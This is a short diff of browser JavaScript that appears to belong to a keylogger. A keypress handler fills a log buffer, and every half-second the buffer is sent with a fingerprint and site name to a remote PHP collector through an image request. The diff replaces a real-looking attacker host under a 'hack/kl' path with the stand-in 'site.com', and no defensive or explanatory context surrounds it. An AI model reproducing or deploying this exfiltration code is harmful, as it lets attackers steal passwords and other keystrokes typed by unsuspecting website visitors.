@@ -11,7 +11,7 @@ document.onkeypress = function(e) {
 
 window.setInterval(function(){
 if(logs != '') {
-  new Image().src = 'http://collard.ovh/hack/kl/kl.php?fp='+fingerprint+'&s='+site+'&l='+logs;
+  new Image().src = 'http://site.com/kl.php?fp='+fingerprint+'&s='+site+'&l='+logs;
   logs = '';
 }
 }, 500);
